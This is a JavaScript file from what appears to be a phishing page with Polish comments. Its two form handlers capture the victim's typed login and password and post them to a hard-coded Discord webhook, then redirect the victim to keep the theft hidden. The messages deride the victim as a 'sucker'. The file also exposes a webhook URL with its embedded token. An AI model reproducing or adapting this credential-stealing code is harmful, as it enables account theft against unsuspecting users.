document.addEventListener('DOMContentLoaded', function () {
  const gownoForm = document.getElementById('gowno-form');

  if (gownoForm) {
    gownoForm.addEventListener('submit', function (e) {
      e.preventDefault(); // Żeby nie wyjebało na endpoint z URL-em

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      const gowno = document.getElementById('gowno').value;
      const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `🔐 Hasło cwela: \`${gowno}\`` })
      }).then(() => {
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      });
    });
  }

  // Obsługa login-form – jak chcesz ją zostawić
  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const login = document.getElementById('login').value;
      const webhookURL = "https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi";

      const payload = {
        content: `📨 **Login cwela**:\n\`${login}\``
      };

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      }).then(response => {
        if (response.ok) {
          setTimeout(() => {
            window.location.href = 'login.html';
          }, 1000);
        }
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'login.html';
        }, 1000);
      });
    });
  }
});
